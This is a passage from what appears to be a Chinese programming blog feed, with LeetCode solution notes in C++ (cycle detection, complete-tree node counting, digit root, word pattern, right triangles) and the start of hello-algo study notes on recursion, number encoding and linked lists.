class="headerlink" title="思路和算法二：快慢指针"></a>思路和算法二：快慢指针</h5><p>我们定义两个指针，一快一慢。慢指针每次只移动一步，而快指针每次移动两步。初始时，慢指针在位置 head，而快指针在位置 head.next。这样一来，如果在移动的过程中，快指针反过来追上慢指针，就说明该链表为环形链表。否则快指针将到达链表尾部，该链表不为环形链表。</p><h5 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">nullptr</span> || head-&gt;next == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        ListNode* slow = head;<br>        ListNode* fast = head-&gt;next;<br>        <span class="hljs-keyword">while</span> (slow != fast) &#123;<br>            <span class="hljs-keyword">if</span> (fast == <span class="hljs-literal">nullptr</span> || fast-&gt;next == <span class="hljs-literal">nullptr</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            slow = slow-&gt;next;<br>            fast = fast-&gt;next-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="复杂度分析-2"><a href="#复杂度分析-2" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p>时间复杂度：$O(N)$，其中$N$ 是链表中的节点数。</p><p>当链表中不存在环时，快指针将先于慢指针到达链表尾部，链表中每个节点至多被访问两次。</p><p>当链表中存在环时，每一轮移动后，快慢指针的距离将减小一。而初始距离为环的长度，因此至多移动 $N$ 轮。</p><p>空间复杂度：$O(1)$。我们只使用了两个指针的额外空间。</p><h4 id="T222-完全二叉树的节点个数"><a href="#T222-完全二叉树的节点个数" class="headerlink" title="T222 完全二叉树的节点个数"></a>T222 完全二叉树的节点个数</h4><h5 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h5><p>给你一棵 <strong>完全二叉树</strong> 的根节点 <code>root</code> ，求出该树的节点个数。</p><p><strong>进阶：</strong>遍历树来统计节点是一种时间复杂度为 <code>O(n)</code> 的简单解决方案。你可以设计一个更快的算法吗？</p><h5 id="思路和算法-4"><a href="#思路和算法-4" class="headerlink" title="思路和算法"></a>思路和算法</h5><p><a href="https://leetcode.cn/problems/count-complete-tree-nodes/solutions/495655/wan-quan-er-cha-shu-de-jie-dian-ge-shu-by-leetco-2/">https://leetcode.cn/problems/count-complete-tree-nodes/solutions/495655/wan-quan-er-cha-shu-de-jie-dian-ge-shu-by-leetco-2/</a></p><p>使用二进制数和二叉树的对应关系进行查找，如100代表根节点的左孩子的左孩子，也是完全二叉树的第6个节点。这样就可以通过对最低层的节点十进制序号进行二分查找，并使用位运算进行二进制匹配，就可以在更快的时间内完成。</p><h5 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countNodes</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> level = <span class="hljs-number">0</span>;<br>        TreeNode* node = root;<br>        <span class="hljs-keyword">while</span> (node-&gt;left != <span class="hljs-literal">nullptr</span>) &#123;<br>            level++;<br>            node = node-&gt;left;<br>        &#125;<br>        <span class="hljs-type">int</span> low = <span class="hljs-number">1</span> &lt;&lt; level, high = (<span class="hljs-number">1</span> &lt;&lt; (level + <span class="hljs-number">1</span>)) - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (low &lt; high) &#123;<br>            <span class="hljs-type">int</span> mid = (high - low + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span> + low;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">exists</span>(root, level, mid)) &#123;<br>                low = mid;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                high = mid - <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> low;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">exists</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-type">int</span> bits = <span class="hljs-number">1</span> &lt;&lt; (level - <span class="hljs-number">1</span>);<br>        TreeNode* node = root;<br>        <span class="hljs-keyword">while</span> (node != <span class="hljs-literal">nullptr</span> &amp;&amp; bits &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!(bits &amp; k)) &#123;<br>                node = node-&gt;left;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                node = node-&gt;right;<br>            &#125;<br>            bits &gt;&gt;= <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> node != <span class="hljs-literal">nullptr</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="复杂度分析-3"><a href="#复杂度分析-3" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p>时间复杂度：$O(h^2)&#x2F;O(log^2n)$。</p><p>空间复杂度：$O(1)$。</p><h4 id="T258-各位相加"><a href="#T258-各位相加" class="headerlink" title="T258 各位相加"></a>T258 各位相加</h4><h5 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h5><p>给定一个非负整数 <code>num</code>，反复将各个位上的数字相加，直到结果为一位数。返回这个结果。</p><blockquote><p> 输入: num &#x3D; 38<br>    输出: 2<br>    解释: 各位相加的过程为：<br>    38 –&gt; 3 + 8 –&gt; 11<br>    11 –&gt; 1 + 1 –&gt; 2<br>    由于 2 是一位数，所以返回 2。</p></blockquote><p><strong>进阶：</strong>你可以不使用循环或者递归，在 <code>O(1)</code> 时间复杂度内解决这个问题吗？</p><h5 id="思路和算法-5"><a href="#思路和算法-5" class="headerlink" title="思路和算法"></a>思路和算法</h5><p><a href="https://leetcode.cn/problems/add-digits/solutions/1301157/ge-wei-xiang-jia-by-leetcode-solution-u4kj/">https://leetcode.cn/problems/add-digits/solutions/1301157/ge-wei-xiang-jia-by-leetcode-solution-u4kj/</a></p><p>假设整数<code>num</code>的十进制表示有n位，从最低位到最高位依次是$a_0$到$a_{n−1}$，则 <code>num</code>可以写成<br>$$<br>\sum_{i&#x3D;0}^{n-1}a_i \times (10^i-1) + \sum_{i&#x3D;0}^{n-1}a_i<br>$$</p><p>对于任意非负整数 $i$，$10^i−1$ 都是 9 的倍数。由此可得<code>num</code>与其各位相加的结果模 9 同余。重复计算各位相加的结果直到结果为一位数时，该一位数即为 num 的数根，num 与其数根模 9 同余。由于最终结果取值为0～9，我们可以对<code>num</code>先减去1再取余，最后加上1，这样就能同时处理<code>num</code>是9的倍数（结果为9）和<code>num</code>为0的情况。</p><h5 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">addDigits</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (num - <span class="hljs-number">1</span>) % <span class="hljs-number">9</span> + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="复杂度分析-4"><a href="#复杂度分析-4" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p>时间复杂度：$O(1)$。</p><p>空间复杂度：$O(1)$。</p><h4 id="T290-单词规律"><a href="#T290-单词规律" class="headerlink" title="T290 单词规律"></a>T290 单词规律</h4><h5 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h5><p>给定一种规律 <code>pattern</code> 和一个字符串 <code>s</code> ，判断 <code>s</code> 是否遵循相同的规律。</p><p>这里的 <strong>遵循</strong> 指完全匹配，例如， <code>pattern</code> 里的每个字母和字符串 <code>s</code> 中的每个非空单词之间存在着双向连接的对应规律。 </p><p><strong>示例1:</strong></p><blockquote><p>输入: pattern &#x3D; “abba”, s &#x3D; “dog cat cat dog”</p><p>输出: true</p></blockquote><p><strong>示例 2:</strong></p><blockquote><p>输入:pattern &#x3D; “abba”, s &#x3D; “dog cat cat fish”</p><p>输出: false</p></blockquote><p><strong>示例 3:</strong></p><blockquote><p>输入: pattern &#x3D; “aaaa”, s &#x3D; “dog cat cat dog”</p><p>输出: false</p></blockquote><h5 id="思路和算法-6"><a href="#思路和算法-6" class="headerlink" title="思路和算法"></a>思路和算法</h5><p><a href="https://leetcode.cn/problems/word-pattern/solutions/523102/dan-ci-gui-lu-by-leetcode-solution-6vqv/">https://leetcode.cn/problems/word-pattern/solutions/523102/dan-ci-gui-lu-by-leetcode-solution-6vqv/</a></p><p>在本题中，我们需要判断字符与字符串之间是否恰好一一对应。即任意一个字符都对应着唯一的字符串，任意一个字符串也只被唯一的一个字符对应。在集合论中，这种关系被称为「双射」。</p><p>想要解决本题，我们可以利用哈希表记录每一个字符对应的字符串，以及每一个字符串对应的字符。然后我们枚举每一对字符与字符串的配对过程，不断更新哈希表，如果发生了冲突，则说明给定的输入不满足双射关系。</p><p>在实际代码中，我们枚举 pattern 中的每一个字符，利用双指针来均摊线性地找到该字符在 str 中对应的字符串。每次确定一个字符与字符串的组合，我们就检查是否出现冲突，最后我们再检查两字符串是否比较完毕即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">wordPattern</span><span class="hljs-params">(string pattern, string str)</span> </span>&#123;<br>        unordered_map&lt;string, <span class="hljs-type">char</span>&gt; str2ch;<br>        unordered_map&lt;<span class="hljs-type">char</span>, string&gt; ch2str;<br>        <span class="hljs-type">int</span> m = str.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> ch : pattern) &#123;<br>            <span class="hljs-keyword">if</span> (i &gt;= m) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-type">int</span> j = i;<br>            <span class="hljs-keyword">while</span> (j &lt; m &amp;&amp; str[j] != <span class="hljs-string">&#x27; &#x27;</span>) j++;<br>            string tmp = str.<span class="hljs-built_in">substr</span>(i, j - i);<br>            <span class="hljs-keyword">if</span> (str2ch.<span class="hljs-built_in">count</span>(tmp) &amp;&amp; str2ch[tmp] != ch) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (ch2str.<span class="hljs-built_in">count</span>(ch) &amp;&amp; ch2str[ch] != tmp) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            str2ch[tmp] = ch;<br>            ch2str[ch] = tmp;<br>            i = j + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> i &gt;= m;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="复杂度分析-5"><a href="#复杂度分析-5" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p>时间复杂度：$O(n+m)$，其中 $n$ 为 $pattern$ 的长度，$m$ 为 $str$ 的长度。插入和查询哈希表的均摊时间复杂度均为 $O(n+m)$。每一个字符至多只被遍历一次。</p><p>空间复杂度：$O(n+m)$，其中 $n$ 为 $pattern$ 的长度，$m$ 为 $str$ 的长度。最坏情况下，我们需要存储 $pattern$ 中的每一个字符和 $str$ 中的每一个字符串。</p><h4 id="T3128-直角三角形"><a href="#T3128-直角三角形" class="headerlink" title="T3128 直角三角形"></a>T3128 直角三角形</h4><h5 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h5><p>给你一个二维 boolean 矩阵 <code>grid</code> 。</p><p>请你返回使用 <code>grid</code> 中的 3 个元素可以构建的<strong>直角三角形</strong>数目，且满足3个元素值<strong>都</strong>为1。</p><p><strong>注意：</strong></p><ul><li>如果 <code>grid</code> 中 3 个元素满足：一个元素与另一个元素在 <strong>同一行</strong>，同时与第三个元素在 <strong>同一列</strong> ，那么这 3 个元素称为一个 <strong>直角三角形</strong> 。这 3 个元素互相之间不需要相邻。</li></ul><blockquote><p>输入：grid &#x3D; [[0,1,0],[0,1,1],[0,1,0]]</p><p>输出：2</p><p>解释：有 2 个直角三角形。</p></blockquote><h5 id="思路和算法-7"><a href="#思路和算法-7" class="headerlink" title="思路和算法"></a>思路和算法</h5><p><a href="https://leetcode.cn/problems/right-triangles/solutions/2861202/zhi-jiao-san-jiao-xing-by-leetcode-solut-zbz2/">https://leetcode.cn/problems/right-triangles/solutions/2861202/zhi-jiao-san-jiao-xing-by-leetcode-solut-zbz2/</a></p><p>直接枚举三个点判断是否为直角三角形的方法未免过于低效，我们可以固定一个点，然后来统计其他两个点的合法方法数。</p><p>考虑枚举两条直角边的交点，然后将「该点所在行的其他点」与「该点所在列的其他点」一一匹配，即可得到所有以该点为直角边交点的所有方案。设 <code>row</code> 为交点所在行 1 的个数，<code>col</code> 为交点所在列 1 的个数，那么它的贡献是 <code>(row−1)×(col−1)</code>，将所有交点的贡献加起来就是答案。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">numberOfRightTriangles</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = grid.<span class="hljs-built_in">size</span>(), m = grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">col</span><span class="hljs-params">(m)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>                col[j] += grid[i][j];<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-type">int</span> row = <span class="hljs-built_in">accumulate</span>(grid[i].<span class="hljs-built_in">begin</span>(), grid[i].<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>                <span class="hljs-keyword">if</span> (grid[i][j] == <span class="hljs-number">1</span>) &#123;<br>                    res += (row - <span class="hljs-number">1</span>) * (col[j] - <span class="hljs-number">1</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="复杂度分析-6"><a href="#复杂度分析-6" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p>时间复杂度：$O(nm)$，其中$n$是$grid$的行数，$m$是$grid$的列数。</p><p>空间复杂度：$O(m)$。</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
      <tag>招聘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello-algo 学习笔记</title>
    <link href="/2024/07/22/hello-algo-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/07/22/hello-algo-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>写在前面：最近正准备复习数据结构，想找一些文字看，这个<strong>hello-algo</strong>项目躺在我的GitHub仓库里很久了一直没打开，因此最近闲暇时间看一遍，笔记里都是我对项目内容的摘抄，主要是对我个人比较新鲜的内容的记录，所以看起来会很不连贯和完整～</p><p>项目链接：<a href="https://www.hello-algo.com/">https://www.hello-algo.com</a></p><p class="note note-warning">笔记内容大部分都是对项目的直接拷贝，转载请使用项目对应内容，如果涉及侵权请联系删除。</p><h3 id="第2章-复杂度分析"><a href="#第2章-复杂度分析" class="headerlink" title="第2章 复杂度分析"></a>第2章 复杂度分析</h3><h4 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h4><p><strong>如果函数在返回前的最后一步才进行递归调用</strong>，则该函数可以被编译器或解释器优化，使其在空间效率上与迭代相当。这种情况被称为尾递归（tail recursion）。</p><ul><li><strong>普通递归</strong>：当函数返回到上一层级的函数后，需要继续执行代码，因此系统需要保存上一层调用的上下文。</li><li><strong>尾递归</strong>：递归调用是函数返回前的最后一个操作，这意味着函数返回到上一层级后，无须继续执行其他操作，因此系统无须保存上一层函数的上下文。</li></ul><p>以计算$1+2+3+···+n$为例，我们可以将结果变量 <code>res</code> 设为函数参数，从而实现尾递归：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">tail_recur</span>(<span class="hljs-params">n, res</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;尾递归&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 终止条件</span><br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-comment"># 尾递归调用</span><br>    <span class="hljs-keyword">return</span> tail_recur(n - <span class="hljs-number">1</span>, res + n)<br></code></pre></td></tr></table></figure><p>对比普通递归和尾递归，两者的求和操作的执行点是不同的。</p><ul><li><strong>普通递归</strong>：求和操作是在“归”的过程中执行的，每层返回后都要再执行一次求和操作。</li><li><strong>尾递归</strong>：求和操作是在“递”的过程中执行的，“归”的过程只需层层返回。</li></ul><p><img src="https://www.hello-algo.com/chapter_computational_complexity/iteration_and_recursion.assets/tail_recursion_sum.png" srcset="/img/loading.gif" lazyload></p><p class="note note-danger">请注意，许多编译器或解释器并不支持尾递归优化。例如，Python 默认不支持尾递归优化，因此即使函数是尾递归形式，仍然可能会遇到栈溢出问题。</p><h3 id="第3章-数据结构"><a href="#第3章-数据结构" class="headerlink" title="第3章 数据结构"></a>第3章 数据结构</h3><h4 id="原码、反码和补码"><a href="#原码、反码和补码" class="headerlink" title="原码、反码和补码"></a>原码、反码和补码</h4><p>首先需要指出，<strong>数字是以“补码”的形式存储在计算机中的</strong>。在分析这样做的原因之前，首先给出三者的定义。</p><ul><li><strong>原码</strong>：我们将数字的二进制表示的最高位视为符号位，其中0表示正数，1表示负数，其余位表示数字的值。</li><li><strong>反码</strong>：正数的反码与其原码相同，负数的反码是对其原码除符号位外的所有位取反。</li><li><strong>补码</strong>：正数的补码与其原码相同，负数的补码是在其反码的基础上加1。</li></ul><p><img src="https://www.hello-algo.com/chapter_data_structure/number_encoding.assets/1s_2s_complement.png" srcset="/img/loading.gif" lazyload></p><h4 id="浮点数编码"><a href="#浮点数编码" class="headerlink" title="浮点数编码"></a>浮点数编码</h4><p><strong>浮点数 <code>float</code> 采用了不同的表示方式</strong>。记一个 32 比特长度的二进制数为：</p><div class="arithmatex">\[b_{31} b_{30} b_{29} \ldots b_2 b_1 b_0\]</div><p>根据 IEEE 754 标准，32-bit 长度的 <code>float</code> 由以下三个部分构成。</p><ul><li>符号位 <span class="arithmatex">\(\mathrm{S}\)</span> ：占 1 位 ，对应 <span class="arithmatex">\(b_{31}\)</span> 。</li><li>指数位 <span class="arithmatex">\(\mathrm{E}\)</span> ：占 8 位 ，对应 <span class="arithmatex">\(b_{30} b_{29} \ldots b_{23}\)</span> 。</li><li>分数位 <span class="arithmatex">\(\mathrm{N}\)</span> ：占 23 位 ，对应 <span class="arithmatex">\(b_{22} b_{21} \ldots b_0\)</span> 。</li></ul><p>二进制数 <code>float</code> 对应值的计算方法为：</p><div class="arithmatex">\[\text {val} = (-1)^{b_{31}} \times 2^{\left(b_{30} b_{29} \ldots b_{23}\right)_2-127} \times\left(1 . b_{22} b_{21} \ldots b_0\right)_2\]</div><p>转化到十进制下的计算公式为：</p><div class="arithmatex">\[\text {val}=(-1)^{\mathrm{S}} \times 2^{\mathrm{E} -127} \times (1 + \mathrm{N})\]</div><p>其中各项的取值范围为：</p><div class="arithmatex">\[\begin{aligned}\mathrm{S} \in &amp; \{ 0, 1\}, \quad \mathrm{E} \in \{ 1, 2, \dots, 254 \} \newline(1 + \mathrm{N}) = &amp; (1 + \sum_{i=1}^{23} b_{23-i} 2^{-i}) \subset [1, 2 - 2^{-23}]\end{aligned}\]</div><p><img src="https://www.hello-algo.com/chapter_data_structure/number_encoding.assets/ieee_754_float.png" srcset="/img/loading.gif" lazyload></p><p><strong>尽管浮点数 <code>float</code> 扩展了取值范围，但其副作用是牺牲了精度</strong>。整数类型 <code>int</code> 将全部 32 比特用于表示数字，数字是均匀分布的；而由于指数位的存在，浮点数 <code>float</code> 的数值越大，相邻两个数字之间的差值就会趋向越大。</p><p>如表所示，指数位 <span class="arithmatex">\(\mathrm{E} = 0\)</span> 和 <span class="arithmatex">\(\mathrm{E} = 255\)</span> 具有特殊含义，<strong>用于表示零、无穷大、<span class="arithmatex">\(\mathrm{NaN}\)</span> 等</strong>。</p><div class="center-table"><table><thead><tr><th>指数位 E</th><th>分数位 <span class="arithmatex">\(\mathrm{N} = 0\)</span></th><th>分数位 <span class="arithmatex">\(\mathrm{N} \ne 0\)</span></th><th>计算公式</th></tr></thead><tbody><tr><td><span class="arithmatex">\(0\)</span></td><td><span class="arithmatex">\(\pm 0\)</span></td><td>次正规数</td><td><span class="arithmatex">\((-1)^{\mathrm{S}} \times 2^{-126} \times (0.\mathrm{N})\)</span></td></tr><tr><td><span class="arithmatex">\(1, 2, \dots, 254\)</span></td><td>正规数</td><td>正规数</td><td><span class="arithmatex">\((-1)^{\mathrm{S}} \times 2^{(\mathrm{E} -127)} \times (1.\mathrm{N})\)</span></td></tr><tr><td><span class="arithmatex">\(255\)</span></td><td><span class="arithmatex">\(\pm \infty\)</span></td><td><span class="arithmatex">\(\mathrm{NaN}\)</span></td><td></td></tr></tbody></table></div><h4 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h4><p>Unicode编码的介绍：<a href="https://www.hello-algo.com/chapter_data_structure/character_encoding/#343-unicode">https://www.hello-algo.com/chapter_data_structure/character_encoding/#343-unicode</a></p><p><img src="https://www.hello-algo.com/chapter_data_structure/character_encoding.assets/utf-8_hello_algo.png" srcset="/img/loading.gif" lazyload></p><h3 id="第4章-数组与链表"><a href="#第4章-数组与链表" class="headerlink" title="第4章 数组与链表"></a>第4章 数组与链表</h3><h4 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h4><p>链表（linked list）是一种线性数据结构，其中的每个元素都是一个节点对象，各个节点通过“引用”相连接。引用记录了下一个节点的内存地址，通过它可以从当前节点访问到下一个节点。链表的设计使得各个节点可以分散存储在内存各处，它们的内存地址无须连续。如以下代码所示，链表节点 <code>ListNode</code> 除了包含值，还需额外保存一个引用（指针）。因此在相同数据量下，<strong>链表比数组占用更多的内存空间</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 链表节点结构体 */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ListNode</span> &#123;<br>    <span class="hljs-type">int</span> val;         <span class="hljs-comment">// 节点值</span><br>    ListNode *next;  <span class="hljs-comment">// 指向下一节点的指针</span><br>    <span class="hljs-built_in">ListNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">next</span>(<span class="hljs-literal">nullptr</span>) &#123;&#125;  <span class="hljs-comment">// 构造函数</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>建立链表分为两步，第一步是初始化各个节点对象，第二步是构建节点之间的引用关系。初始化完成后，我们就可以从链表的头节点出发，通过引用指向 <code>next</code> 依次访问所有节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化链表 1 -&gt; 3 -&gt; 2 -&gt; 5 -&gt; 4 */</span><br><span class="hljs-comment">// 初始化各个节点</span><br>ListNode* n0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">1</span>);<br>ListNode* n1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">3</span>);<br>ListNode* n2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">2</span>);<br>ListNode* n3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">5</span>);<br>ListNode* n4 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">4</span>);<br><span class="hljs-comment">// 构建节点之间的引用</span><br>n0-&gt;next = n1;<br>n1-&gt;next = n2;<br>n2-&gt;next = n3;<br>n3-&gt;next = n4;<br></code></pre></td></tr></table></figure><p>数组整体是一个变量，比如数组 <code>nums</code> 包含元素 <code>nums[0]</code> 和 <code>nums[1]</code> 等，而链表是由多个独立的节点对象组成的。<strong>我们通常将头节点当作链表的代称</strong>，比如以上代码中的链表可记作链表 <code>n0</code> 。</p><p><img 